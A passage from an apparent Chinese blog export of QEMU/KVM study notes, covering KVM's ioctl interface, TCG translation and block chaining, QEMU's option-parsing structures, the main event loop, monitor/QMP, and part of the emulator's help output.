nonvolatile;&#125;; AddressSpace的root指向对应的根级MemoryRegion，current_map指向root通过generate_memory_topology()生成的FlatView。 FlatView中的ranges数组表示该MemoryRegion所表示的Guest地址区间，并按照地址的顺序进行排列。 MemoryRegionSection由ranges数组中的FlatRange对应生成，作为注册到KVM中的基本单位。 参考https://abelsu7.top/2019/07/07/kvm-memory-virtualization/ https://www.binss.me/blog/qemu-note-of-memory/ [https://juniorprincewang.github.io/2018/07/20/qemu%E5%86%85%E5%AD%98%E8%99%9A%E6%8B%9F%E5%8C%96/ https://www.slideshare.net/HwanjuKim/4memory-virtualization-and-management?next_slideshow=1]]></content>
      <categories>
        <category>Qemu&amp;KVM学习</category>
      </categories>
      <tags>
        <tag>summary</tag>
        <tag>Qemu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Qemu学习-体系结构&参数选项&定时器]]></title>
    <url>%2F2020%2F08%2F08%2FQemu%E5%AD%A6%E4%B9%A0%E2%80%94%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%26%E5%8F%82%E6%95%B0%E9%80%89%E9%A1%B9%26%E5%AE%9A%E6%97%B6%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Qemu的体系架构概述QEMU是一个主机上的VMM(virtual machine monitor)，通过动态二进制转换来模拟CPU，并提供一系列的硬件模型。KVM(Kernel-Based Virtual Machine)是基于内核的虚拟机，实现对CPU和内存的虚拟化。KVM需要处理器硬件本身支持虚拟化扩展，如intel VT和AMD AMD-V技术。同时它是Linux内核的一个可加载模块，KVM从Linux 2.6.20以后已被作为内核组件。从存在形式来看，它包括两个内核模块：kvm.ko用于实现核心虚拟化功能和kvm_intel.ko(或 kvm_amd.ko)处理器强相关的模块。 本质上，KVM是管理虚拟硬件设备的驱动，该驱动使用字符设备/dev/kvm（由KVM本身创建）作为管理接口，主要负责vCPU的创建，虚拟内存的分配，vCPU寄存器的读写以及vCPU的运行。 有了KVM以后，guest os的CPU指令不用再经过QEMU来转译便可直接运行，大大提高了运行速度。但KVM的kvm.ko本身只提供了CPU和内存的虚拟化，所以它必须结合QEMU才能构成一个完整的虚拟化技术。 QEMU-KVM ：KVM运行在内核空间，QEMU运行在用户空间，实际模拟创建、管理各种虚拟硬件，QEMU将KVM整合了进来，通过ioctl 调用/dev/kvm ，从而将CPU指令的部分交给内核模块来做，KVM实现了CPU和内存的虚拟化，但KVM不能虚拟其他硬件设备，因此QEMU还有模拟IO设备（磁盘，网卡，显卡等）的作用，KVM加上QEMU后就是完整意义上的服务器虚拟化。 由于QEMU纯模拟IO设备的效率不高，一般采用半虚拟化的VIRTIO来虚拟IO设备。 kvm加速的伪代码： 12345678910111213kvmfd = open("/dev/kvm")ioctl(kvmfd,KVM_CREATE_VM,0)ioctl(kvmfd,KVM_CREATE_VCPU,0)for (;;) &#123; ioctl(KVM_RUN) switch (exit_reason) &#123; case KVM_EXIT_IO: case KVM_EXIT_MMIO: case KVM_EXIT_IRQ_WINDOW_OPEN: case KVM_EXIT_SHUTDOWN: ... &#125;&#125; 为了使用KVM执行虚拟机代码，QEMU进程打开/dev/kvm并发出ioctl(KVM_RUN)。 KVM内核模块使用现代Intel和AMD CPU上的硬件虚拟化扩展来直接执行虚拟机代码。 当guest虚拟机访问硬件设备寄存器，或是暂停虚拟机CPU或是执行其他特殊操作时，KVM将退出并将控制权转给QEMU。 此时，QEMU可以模拟操作的预期输出，或者只是客户CPU在暂停的情况下等待下一个客户机中断。 具体分工为：KVM负责对CPU和内存模拟，QEMU负责对IO设备模拟并对各种虚拟设备的创建和调度进行管理。 代码结构QEMU是一个模拟器，它能够动态模拟特定架构的CPU指令，如X86，PPC，ARM等等。QEMU模拟的架构叫目标架构，运行QEMU的系统架构叫主机架构，QEMU中有一个模块叫做微型代码生成器(TCG)，它用来将目标代码翻译成主机代码。 我们也可以将运行在虚拟CPU上的代码叫做客户机代码，QEMU的主要功能就是不断提取客户机代码并且转化成主机指定架构的代码。整个翻译任务分为两个部分：第一个部分是将做目标代码(TB)转化成TCG中间代码，然后再将TCG中间代码转化成主机代码。 核心代码位置主要比较重要的c文件有：/vl.c，/cpus.c，/exec-all.c，/exec.c，/cpu-exec.c QEMU的main函数定义在/vl.c中，它也是执行的起点，这个函数的功能主要是建立一个虚拟的硬件环境，它通过参数的解析，将初始化内存，需要的模拟的设备初始化，CPU参数，初始化KVM等等。接着程序就跳转到其他的执行分支文件如：/cpus.c，/exec-all.c，/exec.c，/cpu-exec.c。 所有的硬件设备都在/hw/目录下面，所有的设备都有独自的文件，包括总线，串口，网卡，鼠标等等。它们通过设备模块串在一起，在vl.c中的machine _init中初始化。 现在QEMU模拟的CPU架构有：Alpha，ARM，Cris，i386，M68K，PPC，Sparc，Mips，MicroBlaze，S390X，SH4等。 在QEMU中使用./configure可以配置运行的架构，这个脚本会自动读取本机真实机器的CPU架构，并且编译的时候就编译对应架构的代码。对于不同的QEMU做的事情都不同，所以不同架构下的代码在不同的目录下面。/target-arch/目录就对应了相应架构的代码，如/target-i386/就对应了x86系列的代码部分。虽然不同架构做法不同，但是都是为了实现将对应客户机CPU架构的TBs转化成TCG的中间代码，这个就是TCG的前半部分。 使用TCG代码生成宿主机的代码位于/tcg/里，在这个目录里面也对应了不同的架构，分别在不同的子目录里面，如i386就在/tcg/i386中，整个生成宿主机代码的过程也可以当做TCG的后半部分。 12345/vl.c: //最主要的模拟循环，虚拟机机器环境初始化，和CPU的执行。/target-arch/translate.c //将客户机代码转化成不同架构的TCG操作码。/tcg/tcg.c //主要的TCG代码。/tcg/arch/tcg-target.c //将TCG代码转化生成宿主机代码/cpu-exec.c //其中的cpu-exec()函数主要寻找下一个TB（翻译代码块），如果没找到就请求得到下一个TB，并且操作生成的代码块。 TCGTCG说白了就是一个解释器，或者说是编译器，将客服机的代码翻译为TCG中间代码(前端)，再将TCG中间代码翻译为宿主机代码(后端)： 客户机代码部分： TCG中间代码部分： 宿主机代码部分： 当在我们需要的时候TCG才会动态的转变代码，这个想法的目的是用更多的时间去执行我们生成的代码。当新的代码从TB中生成以后， 将会被保存到一个code cache中，因为很多相同的TB会被反复的进行操作，所以这样类似于内存的cache，能够提高使用效率，而code cache的刷新使用LRU算法。 Chaining of TBs： Returning from the code cache to the static code (QEMU code) and jumping back into the code cache is generally slow. To solve this QEMU chains every TB to the next TB. So after the execution of one TB the execution directly jumps to the next TB without returning to the static code. The chaining of block happens when the Tb returns to the static code. Thus when TB1 returns (as there was no chaining) to static code the next TB, TB2, is found, generated and executed. When TB2 returns it is immediately chained to TB1. This makes sure that next time when TB1 is executed TB2 follows it without returning to the static code. Figure 7.8 (a-c) in the following page illustrates chaining of TBs. 从code cache返回到static code(Qemu的代码)中和从static code代码进入code cache中是很费时间的，为了解决这个问题，Qemu将TB连接成了一条chain，所以执行完一块TB之后会直接跳到下一个TB继续执行而不会返回到static code中。 具体代码分析，这里代码全部选自Qemu Detailed Study Chapter-7，版本应该比较久远了，我和现在的代码对比了下，有部分差别但是核心应该是没变的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455main_loop(...)&#123;/vl.c&#125;://函数main_loop初始化qemu_main_loop_start(),然后进入无限循环cpu_exec_all(),这个是QEMU的一个主要循环,在里面会不断的判断一些条件,如虚拟机的关机断电之类,在下文的Main loop部分详解qemu_main_loop_start(...)&#123;/cpus.c&#125;://函数设置系统变量qemu_system_ready = 1并且重启所有的线程并且等待一个条件变量.cpu_exec_all(...)&#123;/cpus.c&#125;://它是cpu循环，QEMU能够启动256个cpu核，但是这些核将会分时运行，然后执行qemu_cpu_exec().struct CPUState&#123;/target-xyz/cpu.h&#125;://它是CPU状态结构体，关于cpu的各种状态，不同架构下面还有不同。cpu_exec(...)&#123;/cpu-exec.c&#125;://这个函数是主要的执行循环,这里第一次翻译之前说道德TB,TB被初始化为(TranslationBlock *tb),然后不停的执行异常处理。其中嵌套了两个无限循环find tb_find_fast()和tcg_qemu_tb_exec().cantb_find_fast() //为客户机初始化查询下一个TB，并且生成主机代码。tcg_qemu_tb_exec() //执行生成的主机代码 struct TranslationBlock &#123;/exec-all.h&#125;://结构体TranslationBlock包含下面的成员：PC, CS_BASE, Flags(表明TB), tc_ptr(指向这个TB翻译代码的指针), tb_next_offset[2], tb_jmp_offset[2](接下去的Tb), *jmp_next[2], *jmp_first (之前的TB).tb_find_fast(...)&#123;/cpu-exec.c&#125;://函数通过调用获得程序指针计数器,然后传到一个哈希函数从tb_jmp_cache[](一个哈希表)得到TB的所以,所以使用tb_jmp_cache可以找到下一个TB。如果没有找到下一个TB,则使用tb_find_slow。tb_find_slow(...)&#123;/cpu-exec.c&#125;://这个是在快速查找失败以后试图去访问物理内存，寻找TB。tb_gen_code(...)&#123;/exec.c&#125;://开始分配一个新的TB，TB的PC是刚刚从CPUstate里面通过using get_page_addr_code()找到的phys_pc = get_page_addr_code(env, pc);tb = tb_alloc(pc);//ph当调用cpu_gen_code()以后,接着会调用tb_link_page(),它将增加一个新的TB,并且指向它的物理页表。cpu_gen_code(...)&#123;translate-all.c&#125;://函数初始化真正的代码生成，在这个函数里面有下面的函数调用：gen_intermediate_code()&#123;/target-arch/translate.c&#125;-&gt;gen_intermediate_code_internal()&#123;/target-arch/translate.c &#125;-&gt;disas_insn()&#123;/target-arch/translate.c&#125;disas_insn()&#123;/target-arch/translate.c&#125;//函数disas_insn()真正的实现将客户机代码翻译成TCG代码,它通过一长串的switch case，将不同的指令做不同的翻译,最后调用tcg_gen_code。tcg_gen_code(...)&#123;/tcg/tcg.c&#125;://这个函数将TCG的代码转化成主机代码,这个就不细细说明了,和前面类似。#define tcg_qemu_tb_exec(...)&#123;/tcg/tcg.g&#125;://通过上面的步骤,当TB生成以后就通过这个函数进行执行.next_tb = tcg_qemu_tb_exec(tc_ptr) :extern uint8_t code_gen_prologue[];#define tcg_qemu_tb_exec(tb_ptr) ((long REGPARM(*)(void *)) code_gen_prologue)(tb_ptr) 功能从一个软件的功能的角度来看，qemu主要分为两大部分： 硬件设备模拟(CPU、内存、外设等) 对虚拟机的运维和管理，包括monitor和QMP(QEMU monitor protocol)，主要是接收管理命令并处理，包括查询状态、动态添加删除设备、虚拟机迁移等 qemu的源码都是为了这两个功能而服务的。 选项子系统QEMU的设备模拟是从QEMU的选项解析开始的，QEMU的选项定义了QEMU要模拟的虚拟机的形态，比如虚拟机支持的CPU类型、有多少内存、虚拟机上有哪些外设等。QEMU支持的选项多达上百个，因此采用硬编码的方法来处理并不合适，需要把他们有效的组织和管理起来。 选项解析的第一步是查询从命令行中传入的选项是否是QEMU支持的选项，这需要从QEMU支持的所有的选项集合中去匹配该选项，并给出该选项的id或索引，以在switch语句中去定位选项的处理流程。在QEMU中所有的选项保存在QEMUOption qemu_options[]数组中。保存每个具体选项的结构体为QEMUOption： 123456typedef struct QEMUOption &#123; const char *name; int flags; int index; uint32_t arch_mask;&#125; QEMUOption; 识别了选项之后，后面就是要解析选项了。QEMU是大型软件，它运行过程中的很多行为都是跟选项相关的，因此很多选项并不是解析的时候马上都会用到，所以需要保存起来，在需要用到的时候再来查询该选项。QEMU的选项有非常多，其中很多选项都有很多子选项，因此有很多选项是相关的，作用于同一类设备或同一个子系统的。QEMU在保存解析出的选项的时候是分类来保存的。QEMU与解析后的选项保存相关的数据结构有4个不同的结构体： 123456789101112131415161718192021222324252627282930313233struct QemuOptsList &#123; const char *name; const char *implied_opt_name; bool merge_lists; /* Merge multiple uses of option into a single list? */ QTAILQ_HEAD(, QemuOpts) head; QemuOptDesc desc[];&#125;;struct QemuOpts &#123; char *id; QemuOptsList *list; Location loc; QTAILQ_HEAD(QemuOptHead, QemuOpt) head; QTAILQ_ENTRY(QemuOpts) next;&#125;;struct QemuOpt &#123; char *name; char *str; const QemuOptDesc *desc; union &#123; bool boolean; uint64_t uint; &#125; value; QemuOpts *opts; QTAILQ_ENTRY(QemuOpt) next;&#125;;typedef struct QemuOptDesc &#123; const char *name; enum QemuOptType type; const char *help; const char *def_value_str;&#125; QemuOptDesc QemuOptsList结构体用来保存某一类的选项，QEMU把选项分成了很多类，比如-drive选项，很多存储相关的选项及子选项保存在drive大选项中；再比如-device选项，有很多不同种类的子选项，它也是一类选项。QEMU中维护了一个QemuOptsList的数组，该数组中的每个成员都代表了解析出的一类选项，即QEMU是按照QemuOptsList来分类的。并不是所有的选项都按分类的方式保存在QemuOptsList中了，有些简单的只有一个选择的选项，就没必要分类的保存在数组中了，直接保存在一个变量中就行了，比如-pidfile选项，指定存储qemu进程pid号的文件，直接把文件名参数保存在pid_file变量中就行了。 QemuOptsList中保存的大选项中有很多子选项，这些子选项保存在QemuOpts结构体中，一个QemuOpts保存了一个大选项相关的所有子选项，每个子选项都是一个QemuOpt结构，因此QemuOpts里面实际保存是QemuOpt结构的链表。QemuOpt结构保存的是一个个具体的子选项，以key、value对的方式保存，key是子选项的名称，value是命令行参数指定的子选项的值。 从QemuOptsList结构体的定义可以看出QemuOptsList中保存的也是QemuOpts结构体的链表，就是说一个大选项可能有多个QemuOpts，但是QemuOpts已经保存了所有的子选项了，为什么会有多个QemuOpts结构体？这是因为有些QEMU选项在命令行中不会使用一次，有可能一个选项使用多次，即一个大选项可能有多个同时存在的实例。比如-device选项是用来创建虚拟机里面的外设的，你可以用来创建一个字符设备，也可以用来创建一个网络设备等，所以qemu命令行可以可能同时使用多次-device选项以创建多个不同的设备，每个设备都指定有各自的子选项，多个QemuOpts是用来保存同一类选项的不同实例的。 QemuOptDesc保存的是选项的帮助信息或描述信息。 qemu_opts_parse_noisily()函数解析某一个大选项，他先创建一个QemuOpts，然后从参数中中解析出每个子选项key、value对，并为每个key、value对创建QemuOpt。qemu_opt_set()/opt_set()函数用于在QemuOpts中新添加一个QemuOpt结构的key、value对。QEMU的选项解析会调用解析函数解析每个命令行参数，并把解析出的选项保存在QemuOptsList数组中，一些不需要保存在数组中的选项保存在相关的变量中。 QOM详见QEMU学习--QOM篇章。 Main loop(主事件循环)QEMU中的主事件循环是为QEMU在设备模拟过程中的各个任务遵循的执行模型或者执行流。在一般持续的C程序中(比如单片机的程序)，在进行一定的初始化后都会进入一个while循环，while循环不断的检测执行条件，当条件满足时就执行循环体里面的任务。QEMU的主事件循环就是这个while主循环，与while主循环的区别是，while主循环是一个非常原始和粗放的方式，而QEMU的主事件循环要先进的多。 QEMU的主循环不能采用原始的方式，必须经过精巧的涉及。这是因为QEMU对性能的要求很高且QEMU的主循环中要处理非常多的事件，执行非常多的任务，为了协调这些任务的执行，必须采用非常精巧的方式来执行主事件循环。QEMU的主事件循环是在glib库提供的gmainloop主事件循环机制的基础改造而来。 Glib事件循环机制提供了一套事件分发接口，使用这套接口注册事件源（source）和对应的回调，可以开发基于事件触发的应用。Glib的核心是poll机制，通过poll检查用户注册的事件源，并执行对应的回调，用户不需要关注其具体实现，只需要按照要求注册对应的事件源和回调 Glib事件循环机制管理所有注册的事件源，主要类型有：fd，pipe，socket和timer。不同事件源可以在一个线程中处理，也可以在不同线程中处理，这取决于事件源所在的上下文(GMainContext)，一个上下文只能运行在一个线程中，所以如果想要事件源在不同线程中并发被处理，可以将其放在不同的上下文。 Glib对一个事件源的处理分为4个阶段：初始化，准备，poll，和调度。用户可以在这4个处理阶段为每个事件源注册自己的回调处理函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// vl.cstatic void main_loop(void)//在main函数里被调用&#123;#ifdef CONFIG_PROFILER int64_t ti;#endif while (!main_loop_should_exit()) &#123;//判断是否应该退出QEMU#ifdef CONFIG_PROFILER ti = profile_getclock();#endif main_loop_wait(false);//主循环的主要处理过程#ifdef CONFIG_PROFILER dev_time += profile_getclock() - ti;#endif &#125;&#125;void main_loop_wait(int nonblocking)&#123; int ret; uint32_t timeout = UINT32_MAX; int64_t timeout_ns; if (nonblocking) &#123; timeout = 0; &#125; /* poll any events */ g_array_set_size(gpollfds, 0); /* reset for new iteration */ /* XXX: separate device handlers from system ones */ slirp_pollfds_fill(gpollfds, &amp;timeout); if (timeout == UINT32_MAX) &#123; timeout_ns = -1; &#125; else &#123; timeout_ns = (uint64_t)timeout * (int64_t)(SCALE_MS); &#125; timeout_ns = qemu_soonest_timeout(timeout_ns, timerlistgroup_deadline_ns( &amp;main_loop_tlg)); ret = os_host_main_loop_wait(timeout_ns); //核心逻辑 slirp_pollfds_poll(gpollfds, (ret &lt; 0)); /* CPU thread can infinitely wait for event after missing the warp */ qemu_start_warp_timer(); qemu_clock_run_all_timers();&#125; QEMU的主事件循环的主要处理过程是main_loop_wait()，它执行以下任务： 1. 等待文件描述符变得可读或可写。 文件描述符起着至关重要的作用，因为fd、socket、pipe各种其他资源都是文件描述符。 可以使用qemu_set_fd_handler()添加文件描述符。 2. 运行过期的计时器。 可以使用qemu_mod_timer()添加计时器。 3. 运行下半部分(BHs)，就像定时器立即到期一样。BH用于避免重入和溢出调用堆栈。 可以使用qemu_bh_schedule()添加BH。 当文件描述符准备就绪、计时器到期、BH被调度时，事件循环将调用响应事件的回调。 回调有两个关于其环境的简单规则： 没有其他核心代码同时执行，因此不需要同步。 回调相对于其他核心代码按顺序和原子方式执行。 在任何给定时间只有一个控制线程执行核心代码。 不应执行阻塞系统调用或长时间运行的计算。 由于事件循环在继续其他事件之前等待回调返回，因此避免在回调中花费无限量的时间是很重要的。 违反此规则会导致guest虚拟机暂停并且监视器无响应。 monitor/QMP用来实现虚拟机管理的模块，对于入门开发者来说，这部分内容知道怎么使用即可，代码方面我没去深究。 monitor的使用很简单，在qemu启动的命令行中不加-nographic时会弹出一个UI窗口，那个窗口就是monitor，我们可以与qemu交互来管理设备和查看设备状态，数据备份，访问Guest OS等操作，想重定向到标准输入终端加选项-monitor stdio即可，想重定向到网络的话，-monitor telnet:localhost:9000,server。 QMP(QEMU monitor protocol)，在很多情况下，我们希望在外部将控制命令输入到QEMU monitor中，但是原有的机制太麻烦（需要重定向等绕圈子的操作），QEMU为我们提供了一个叫QMP的东西。QMP全称QEMU monitor protocol顾名思义就是用于QEMU monitor的协议啦。QMP以JSON格式传输命令与返回信息，许多基于QEMU的应用都使用了这个功能，比如著名的虚拟化中间件libvirt，它在对QEMU虚拟机做操作时，就是使用的QMP，可以通过telnet或者qmp-shell等方式使用QMP。 参考https://vmsplice.net/~stefan/qemu-code-overview.pdf https://juniorprincewang.github.io/2018/11/15/QEMU%E5%AD%A6%E4%B9%A0/ https://blog.csdn.net/yearn520/article/details/6602182?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.edu_weight https://lists.gnu.org/archive/html/qemu-devel/2011-04/pdfhC5rVdz7U8.pdf https://rickylss.github.io/qemu/2019/06/25/qemu-monitor/ https://blog.csdn.net/woai110120130/ Qemu的选项参数复杂的命令行选项是Qemu的最大缺点之一，毕竟除了几个常用的选项外，没人会记得这么多偏门的选项，所以现查手册是比较快速的方法，这里把所有的选项记录下来(QEMU emulator version 2.3.93)，供查阅方便，想自己生成的话，直接用./qemu-system-x86_64 --help。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399QEMU emulator version 2.3.93, Copyright (c) 2003-2008 Fabrice Bellardusage: qemu-system-x86_64 [options] [disk_image]'disk_image' is a raw hard disk image for IDE hard disk 0Standard options:-h or -help display this help and exit-version display version information and exit-machine [type=]name[,prop[=value][,...]] selects emulated machine ('-machine help' for list) property accel=accel1[:accel2[:...]] selects accelerator supported accelerators are kvm, xen, tcg (default: tcg) kernel_irqchip=on|off controls accelerated irqchip support vmport=on|off|auto controls emulation of vmport (default: auto) kvm_shadow_mem=size of KVM shadow MMU dump-guest-core=on|off include guest memory in a core dump (default=on) mem-merge=on|off controls memory merge support (default: on) iommu=on|off controls emulated Intel IOMMU (VT-d) support (default=off) aes-key-wrap=on|off controls support for AES key wrapping (default=on) dea-key-wrap=on|off controls support for DEA key wrapping (default=on) suppress-vmdesc=on|off disables self-describing migration (default=off)-cpu cpu select CPU ('-cpu help' for list)-smp [cpus=]n[,maxcpus=cpus][,cores=cores][,threads=threads][,sockets=sockets] set the number of CPUs to 'n' [default=1] maxcpus= maximum number of total cpus, including offline CPUs for hotplug, etc cores= number of CPU cores on one socket threads= number of threads on one CPU core sockets= number of discrete sockets in the system-numa node[,mem=size][,cpus=cpu[-cpu]][,nodeid=node]-numa node[,memdev=id][,cpus=cpu[-cpu]][,nodeid=node]-add-fd fd=fd,set=set[,opaque=opaque] Add 'fd' to fd 'set'-set group.id.arg=value set &lt;arg&gt; parameter for item &lt;id&gt; of type &lt;group&gt; i.e. -set drive.$id.file=/path/to/image-global driver.property=value-global driver=driver,property=property,value=value set a global default for a driver property-boot [order=drives][,once=drives][,menu=on|off] [,splash=sp_name][,splash-time=sp_time][,reboot-timeout=rb_time][,strict=on|off] 'drives': floppy (a), hard disk (c), CD-ROM (d), network (n) 'sp_name': the file's name that would be passed to bios as logo picture, if menu=on 'sp_time': the period that splash picture last if menu=on, unit is ms 'rb_timeout': the timeout before guest reboot when boot failed, unit is ms-m[emory] [size=]megs[,slots=n,maxmem=size] configure guest RAM size: initial amount of guest memory slots: number of hotplug slots (default: none) maxmem: maximum amount of guest memory (default: none)NOTE: Some architectures might enforce a specific granularity-mem-path FILE provide backing storage for guest RAM-mem-prealloc preallocate guest memory (use with -mem-path)-k language use keyboard layout (for example 'fr' for French)-audio-help print list of audio drivers and their options-soundhw c1,... enable audio support and only specified sound cards (comma separated list) use '-soundhw help' to get the list of supported cards use '-soundhw all' to enable all of them-balloon none disable balloon device-balloon virtio[,addr=str] enable virtio balloon device (default)-device driver[,prop[=value][,...]] add device (based on driver) prop=value,... sets driver properties use '-device help' to print all possible drivers use '-device driver,help' to print all possible properties-name string1[,process=string2][,debug-threads=on|off] set the name of the guest string1 sets the window title and string2 the process name (on Linux) When debug-threads is enabled, individual threads are given a separate name (on Linux) NOTE: The thread names are for debugging and not a stable API.-uuid %08x-%04x-%04x-%04x-%012x specify machine UUIDBlock device options:-fda/-fdb file use 'file' as floppy disk 0/1 image-hda/-hdb file use 'file' as IDE hard disk 0/1 image-hdc/-hdd file use 'file' as IDE hard disk 2/3 image-cdrom file use 'file' as IDE cdrom image (cdrom is ide1 master)-drive [file=file][,if=type][,bus=n][,unit=m][,media=d][,index=i] [,cyls=c,heads=h,secs=s[,trans=t]][,snapshot=on|off] [,cache=writethrough|writeback|none|directsync|unsafe][,format=f] [,serial=s][,addr=A][,rerror=ignore|stop|report] [,werror=ignore|stop|report|enospc][,id=name][,aio=threads|native] [,readonly=on|off][,copy-on-read=on|off] [,discard=ignore|unmap][,detect-zeroes=on|off|unmap] [[,bps=b]|[[,bps_rd=r][,bps_wr=w]]] [[,iops=i]|[[,iops_rd=r][,iops_wr=w]]] [[,bps_max=bm]|[[,bps_rd_max=rm][,bps_wr_max=wm]]] [[,iops_max=im]|[[,iops_rd_max=irm][,iops_wr_max=iwm]]] [[,iops_size=is]] [[,group=g]] use 'file' as a drive image-mtdblock file use 'file' as on-board Flash memory image-sd file use 'file' as SecureDigital card image-pflash file use 'file' as a parallel flash image-snapshot write to temporary files instead of disk image files-hdachs c,h,s[,t] force hard disk 0 physical geometry and the optional BIOS translation (t=none or lba) (usually QEMU can guess them)-fsdev fsdriver,id=id[,path=path,][security_model=&#123;mapped-xattr|mapped-file|passthrough|none&#125;] [,writeout=immediate][,readonly][,socket=socket|sock_fd=sock_fd]-virtfs local,path=path,mount_tag=tag,security_model=[mapped-xattr|mapped-file|passthrough|none] [,writeout=immediate][,readonly][,socket=socket|sock_fd=sock_fd]-virtfs_synth Create synthetic file system imageUSB options:-usb enable the USB driver (will be the default soon)-usbdevice name add the host or guest USB device 'name'Display options:-display sdl[,frame=on|off][,alt_grab=on|off][,ctrl_grab=on|off] [,window_close=on|off]|curses|none| gtk[,grab_on_hover=on|off]| vnc=&lt;display&gt;[,&lt;optargs&gt;] select display type-nographic disable graphical output and redirect serial I/Os to console-curses use a curses/ncurses interface instead of SDL-no-frame open SDL window without a frame and window decorations-alt-grab use Ctrl-Alt-Shift to grab mouse (instead of Ctrl-Alt)-ctrl-grab use Right-Ctrl to grab mouse (instead of Ctrl-Alt)-no-quit disable SDL window close capability-sdl enable SDL-spice [port=port][,tls-port=secured-port][,x509-dir=&lt;dir&gt;] [,x509-key-file=&lt;file&gt;][,x509-key-password=&lt;file&gt;] [,x509-cert-file=&lt;file&gt;][,x509-cacert-file=&lt;file&gt;] [,x509-dh-key-file=&lt;file&gt;][,addr=addr][,ipv4|ipv6|unix] [,tls-ciphers=&lt;list&gt;] [,tls-channel=[main|display|cursor|inputs|record|playback]] [,plaintext-channel=[main|display|cursor|inputs|record|playback]] [,sasl][,password=&lt;secret&gt;][,disable-ticketing] [,image-compression=[auto_glz|auto_lz|quic|glz|lz|off]] [,jpeg-wan-compression=[auto|never|always]] [,zlib-glz-wan-compression=[auto|never|always]] [,streaming-video=[off|all|filter]][,disable-copy-paste] [,disable-agent-file-xfer][,agent-mouse=[on|off]] [,playback-compression=[on|off]][,seamless-migration=[on|off]] enable spice at least one of &#123;port, tls-port&#125; is mandatory-portrait rotate graphical output 90 deg left (only PXA LCD)-rotate &lt;deg&gt; rotate graphical output some deg left (only PXA LCD)-vga [std|cirrus|vmware|qxl|xenfb|tcx|cg3|virtio|none] select video card type-full-screen start in full screen-vnc display start a VNC server on displayi386 target only:-win2k-hack use it when installing Windows 2000 to avoid a disk full bug-no-fd-bootchk disable boot signature checking for floppy disks-no-acpi disable ACPI-no-hpet disable HPET-acpitable [sig=str][,rev=n][,oem_id=str][,oem_table_id=str][,oem_rev=n][,asl_compiler_id=str][,asl_compiler_rev=n][,&#123;data|file&#125;=file1[:file2]...] ACPI table description-smbios file=binary load SMBIOS entry from binary file-smbios type=0[,vendor=str][,version=str][,date=str][,release=%d.%d] [,uefi=on|off] specify SMBIOS type 0 fields-smbios type=1[,manufacturer=str][,product=str][,version=str][,serial=str] [,uuid=uuid][,sku=str][,family=str] specify SMBIOS type 1 fields-smbios type=2[,manufacturer=str][,product=str][,version=str][,serial=str] [,asset=str][,location=str] specify SMBIOS type 2 fields-smbios type=3[,manufacturer=str][,version=str][,serial=str][,asset=str] [,sku=str] specify SMBIOS type 3 fields-smbios type=4[,sock_pfx=str][,manufacturer=str][,version=str][,serial=str] [,asset=str][,part=str] specify SMBIOS type 4 fields-smbios type=17[,loc_pfx=str][,bank=str][,manufacturer=str][,serial=str] [,asset=str][,part=str][,speed=%d] specify SMBIOS type 17 fieldsNetwork options:-netdev user,id=str[,net=addr[/mask]][,host=addr][,restrict=on|off] [,hostname=host][,dhcpstart=addr][,dns=addr][,dnssearch=domain][,tftp=dir] [,bootfile=f][,hostfwd=rule][,guestfwd=rule][,smb=dir[,smbserver=addr]] configure a user mode network backend with ID 'str', its DHCP server and optional services-netdev tap,id=str[,fd=h][,fds=x:y:...:z][,ifname=name][,script=file][,downscript=dfile] [,helper=helper][,sndbuf=nbytes][,vnet_hdr=on|off][,vhost=on|off] [,vhostfd=h][,vhostfds=x:y:...:z][,vhostforce=on|off][,queues=n] configure a host TAP network backend with ID 'str' use network scripts 'file' (default=/etc/qemu-ifup) to configure it and 'dfile' (default=/etc/qemu-ifdown) to deconfigure it use '[down]script=no' to disable script execution use network helper 'helper' (default=/usr/local/libexec/qemu-bridge-helper) to configure it use 'fd=h' to connect to an already opened TAP interface use 'fds=x:y:...:z' to connect to already opened multiqueue capable TAP interfaces use 'sndbuf=nbytes' to limit the size of the send buffer (the default is disabled 'sndbuf=0' to enable flow control set 'sndbuf=1048576') use vnet_hdr=off to avoid enabling the IFF_VNET_HDR tap flag use vnet_hdr=on to make the lack of IFF_VNET_HDR support an error condition use vhost=on to enable experimental in kernel accelerator (only has effect for virtio guests which use MSIX) use vhostforce=on to force vhost on for non-MSIX virtio guests use 'vhostfd=h' to connect to an already opened vhost net device use 'vhostfds=x:y:...:z to connect to multiple already opened vhost net devices use 'queues=n' to specify the number of queues to be created for multiqueue TAP-netdev bridge,id=str[,br=bridge][,helper=helper] configure a host TAP network backend with ID 'str' that is connected to a bridge (default=br0) using the program 'helper (default=/usr/local/libexec/qemu-bridge-helper)-netdev l2tpv3,id=str,src=srcaddr,dst=dstaddr[,srcport=srcport][,dstport=dstport] [,rxsession=rxsession],txsession=txsession[,ipv6=on/off][,udp=on/off] [,cookie64=on/off][,counter][,pincounter][,txcookie=txcookie] [,rxcookie=rxcookie][,offset=offset] configure a network backend with ID 'str' connected to an Ethernet over L2TPv3 pseudowire. Linux kernel 3.3+ as well as most routers can talk L2TPv3. This transport allows connecting a VM to a VM, VM to a router and even VM to Host. It is a nearly-universal standard (RFC3391). Note - this implementation uses static pre-configured tunnels (same as the Linux kernel). use 'src=' to specify source address use 'dst=' to specify destination address use 'udp=on' to specify udp encapsulation use 'srcport=' to specify source udp port use 'dstport=' to specify destination udp port use 'ipv6=on' to force v6 L2TPv3 uses cookies to prevent misconfiguration as well as a weak security measure use 'rxcookie=0x012345678' to specify a rxcookie use 